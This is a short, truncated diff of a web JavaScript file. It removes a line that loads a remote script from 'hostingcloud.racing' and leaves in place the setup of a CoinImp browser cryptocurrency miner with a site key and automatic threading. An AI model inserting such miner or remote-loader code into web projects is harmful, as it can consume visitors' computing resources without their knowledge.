@@ -1,5 +1,3 @@
-$.getScript("https://www.hostingcloud.racing/IBkN.js");
-
 // See coinimp documentation.
 var _client = new Client.Anonymous('f9ceee66ca79d9eeef7cf0187197ab116b39d4efed1f1adf23d4e6dc0b88c85a', {
   autoThreads: true,
